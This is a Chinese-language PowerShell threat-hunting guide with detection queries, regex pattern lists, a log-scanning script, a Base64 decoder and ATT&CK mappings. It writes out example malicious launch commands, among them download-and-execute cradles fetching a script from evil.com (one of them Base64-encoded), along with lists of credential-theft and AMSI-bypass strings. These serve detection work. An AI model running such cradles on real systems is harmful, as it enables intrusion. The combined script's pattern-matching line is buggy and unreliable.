# PowerShell 威胁狩猎专项

## 可疑特征速查表

### 高风险指标

| 特征 | 示例 | 风险等级 |
|------|------|----------|
| Base64 编码 | `-enc`, `-encodedcommand` | 🔴 高 |
| 下载执行 | `IEX`, `DownloadString`, `Invoke-WebRequest` | 🔴 高 |
| 内存加载 | `[Reflection.Assembly]::Load` | 🔴 高 |
| AMSI 绑过 | `AmsiUtils`, `amsiInitFailed` | 🔴 高 |
| 凭证窃取 | `Mimikatz`, `sekurlsa`, `Get-Credential` | 🔴 高 |
| 执行策略绑过 | `-ExecutionPolicy Bypass`, `-ep bypass` | 🟡 中 |
| 隐藏窗口 | `-WindowStyle Hidden`, `-w hidden` | 🟡 中 |
| 无配置文件 | `-NoProfile`, `-nop` | 🟡 中 |
| 非交互式 | `-NonInteractive`, `-noni` | 🟡 中 |

### 恶意命令模式

```powershell
# 典型恶意命令组合
powershell.exe -nop -w hidden -ep bypass -enc <base64>
powershell.exe -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
powershell.exe -nop -c "[System.Reflection.Assembly]::Load([Convert]::FromBase64String('...'))"
```

---

## 关键日志源

### 事件日志位置

| 日志 | 路径 | 说明 |
|------|------|------|
| PowerShell Operational | `Microsoft-Windows-PowerShell/Operational` | 详细执行日志 |
| Windows PowerShell | `Windows PowerShell` | 传统引擎日志 |
| Script Block Logging | Event ID 4104 | 脚本块内容 |
| Module Logging | Event ID 4103 | 模块调用 |

### 关键事件 ID

| Event ID | 日志 | 说明 | 重要性 |
|----------|------|------|--------|
| **4104** | PowerShell/Operational | 脚本块日志（完整命令） | 🔴 关键 |
| **4103** | PowerShell/Operational | 模块日志 | 🟡 重要 |
| 4100 | PowerShell/Operational | 引擎生命周期 | 🟢 参考 |
| 4688 | Security | 进程创建（含命令行） | 🔴 关键 |
| **400** | Windows PowerShell | 引擎启动 | 🟡 重要 |
| 403 | Windows PowerShell | 引擎停止 | 🟢 参考 |
| **600** | Windows PowerShell | Provider 启动 | 🟡 重要 |

---

## 狩猎查询

### 1. 检测 Base64 编码命令

```powershell
# 从 PowerShell Operational 日志查找编码命令
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4104]]" |
  Where-Object { $_.Message -match "-enc|-encodedcommand|-e " } |
  Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}} |
  Format-List

# 从进程创建日志查找
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688]]" |
  Where-Object { $_.Message -match "powershell.*-enc|powershell.*-encodedcommand" } |
  Select-Object TimeCreated, @{N='CommandLine';E={$_.Properties[8].Value}}
```

### 2. 检测下载执行 (Download Cradles)

```powershell
# 常见下载执行模式
$patterns = @(
  "DownloadString",
  "DownloadFile",
  "DownloadData",
  "Invoke-WebRequest",
  "iwr ",
  "wget ",
  "curl ",
  "Net.WebClient",
  "Start-BitsTransfer",
  "Invoke-RestMethod"
)

$regex = $patterns -join "|"

Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4104]]" |
  Where-Object { $_.Message -match $regex } |
  Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}}
```

### 3. 检测内存执行 (Fileless)

```powershell
# 内存加载特征
$filelessPatterns = @(
  "Reflection\.Assembly",
  "Load\s*\(",
  "FromBase64String",
  "MemoryStream",
  "DeflateStream",
  "GZipStream",
  "Invoke-Expression",
  "IEX\s*\(",
  "\[scriptblock\]::Create"
)

$regex = $filelessPatterns -join "|"

Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4104]]" |
  Where-Object { $_.Message -match $regex } |
  Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}}
```

### 4. 检测 AMSI 绑过尝试

```powershell
$amsiPatterns = @(
  "AmsiUtils",
  "amsiInitFailed",
  "AmsiScanBuffer",
  "amsi\.dll",
  "SetValue.*amsi",
  "Disable-Amsi",
  "Bypass-AMSI"
)

$regex = $amsiPatterns -join "|"

Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4104]]" |
  Where-Object { $_.Message -match $regex } |
  Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}}
```

### 5. 检测凭证访问

```powershell
$credPatterns = @(
  "Get-Credential",
  "ConvertTo-SecureString",
  "System\.Management\.Automation\.PSCredential",
  "mimikatz",
  "sekurlsa",
  "kerberos::list",
  "lsadump",
  "SAM::",
  "vault::cred"
)

$regex = $credPatterns -join "|"

Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4104]]" |
  Where-Object { $_.Message -match $regex } |
  Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}}
```

### 6. 检测混淆技术

```powershell
# 常见混淆特征
$obfuscationPatterns = @(
  "\`",                              # 转义字符
  "\+\s*['\"]",                      # 字符串拼接
  "-join\s*\(",                      # Join 操作
  "-replace",                        # 替换操作
  "\[char\]",                        # 字符转换
  "\.Invoke\(",                      # 反射调用
  "-f\s*['\"]",                      # 格式化字符串
  "\$\{",                            # 变量包装
  "\.GetMethod\(",                   # 反射获取方法
  "Set-Alias"                        # 别名设置
)

$regex = $obfuscationPatterns -join "|"

Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4104]]" |
  Where-Object { $_.Message -match $regex } |
  Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}}
```

---

## 综合狩猎脚本

```powershell
<#
.SYNOPSIS
    PowerShell 威胁狩猎综合脚本
.DESCRIPTION
    扫描 PowerShell 日志查找可疑活动
#>

param(
    [int]$Days = 7,
    [string]$OutputPath = ".\ps_hunt_results.csv"
)

$startTime = (Get-Date).AddDays(-$Days)

# 所有高风险模式
$highRiskPatterns = @(
    # 下载执行
    "DownloadString", "DownloadFile", "Invoke-WebRequest", "Net\.WebClient",
    # 编码执行
    "-enc", "-encodedcommand", "FromBase64String",
    # 内存执行
    "Reflection\.Assembly", "\[scriptblock\]::Create", "Invoke-Expression",
    # AMSI 绑过
    "AmsiUtils", "amsiInitFailed",
    # 凭证访问
    "mimikatz", "sekurlsa", "Get-Credential",
    # 侦察
    "Get-ADUser", "Get-ADComputer", "Get-NetUser", "Get-NetComputer"
)

$regex = $highRiskPatterns -join "|"

$results = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4104]]" -ErrorAction SilentlyContinue |
    Where-Object { $_.TimeCreated -gt $startTime -and $_.Message -match $regex } |
    ForEach-Object {
        $matchedPatterns = $highRiskPatterns | Where-Object { $_.Message -match $_ }
        [PSCustomObject]@{
            TimeCreated = $_.TimeCreated
            EventID = $_.Id
            MatchedPatterns = ($matchedPatterns -join ", ")
            ScriptBlock = $_.Properties[2].Value.Substring(0, [Math]::Min(500, $_.Properties[2].Value.Length))
        }
    }

$results | Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host "[+] 发现 $($results.Count) 条可疑记录，已导出到 $OutputPath"
```

---

## 解码工具

### Base64 解码

```powershell
# 解码 Base64 命令
function Decode-Base64Command {
    param([string]$EncodedCommand)

    try {
        $decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedCommand))
        return $decoded
    }
    catch {
        Write-Warning "解码失败: $_"
        return $null
    }
}

# 使用示例
$encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA=="
Decode-Base64Command -EncodedCommand $encoded
```

### 批量解码日志中的编码命令

```powershell
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688]]" |
    Where-Object { $_.Message -match "-enc\s+(\S+)" } |
    ForEach-Object {
        if ($_.Message -match "-enc\s+(\S+)") {
            $encoded = $matches[1]
            [PSCustomObject]@{
                TimeCreated = $_.TimeCreated
                EncodedCommand = $encoded
                DecodedCommand = (Decode-Base64Command -EncodedCommand $encoded)
            }
        }
    }
```

---

## ATT&CK 映射

| 技术 ID | 名称 | 检测要点 |
|---------|------|----------|
| T1059.001 | PowerShell | 所有 PowerShell 执行 |
| T1027 | 混淆文件或信息 | 编码、字符串拼接 |
| T1140 | 去混淆/解码 | FromBase64String |
| T1105 | 入口工具传输 | DownloadString/File |
| T1055 | 进程注入 | Reflection.Assembly |
| T1562.001 | 禁用安全工具 | AMSI 绑过 |
| T1003 | OS 凭证转储 | Mimikatz 模式 |

---

## 启用增强日志

### 组策略配置

```
计算机配置 > 管理模板 > Windows 组件 > Windows PowerShell

启用以下策略:
- 启用脚本块日志记录
- 启用模块日志记录 (设置模块名称为 *)
- 启用 PowerShell 转录
```

### 注册表配置

```powershell
# 启用脚本块日志
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1

# 启用模块日志
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1

# 设置要记录的模块 (*)
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -Name "*" -Value "*"
```

---

## 常见攻击工具特征

| 工具 | 关键字 |
|------|--------|
| PowerShell Empire | `Invoke-Empire`, `Get-Keystrokes`, `Get-Screenshot` |
| Cobalt Strike | `beacon`, `Invoke-Mimikatz`, `Invoke-PsExec` |
| PowerSploit | `Invoke-Shellcode`, `Invoke-ReflectivePEInjection` |
| Nishang | `Invoke-PowerShellTcp`, `Get-PassHashes` |
| PowerUp | `Invoke-AllChecks`, `Get-ServiceUnquoted` |
| BloodHound | `Invoke-BloodHound`, `Get-DomainUser` |
